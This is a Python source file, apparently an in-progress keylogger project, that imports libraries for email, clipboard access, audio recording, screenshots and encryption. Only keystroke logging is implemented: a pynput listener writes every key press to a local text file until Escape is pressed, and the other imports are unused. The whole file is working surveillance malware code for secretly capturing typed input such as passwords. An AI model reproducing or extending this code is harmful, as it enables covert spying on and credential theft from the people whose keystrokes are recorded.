## Library Imports
# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# System Info
import socket
import platform

# Clipboard
import win32clipboard

# Keys and Listener
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "keys_log.txt"
file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"

count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            # else:  Key.ctrl_lKey.alt_l
            elif k.find("Key") == -1:
                f.write(k)

            f.close()

def on_release(key):
    return False if key == Key.esc else True

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()





















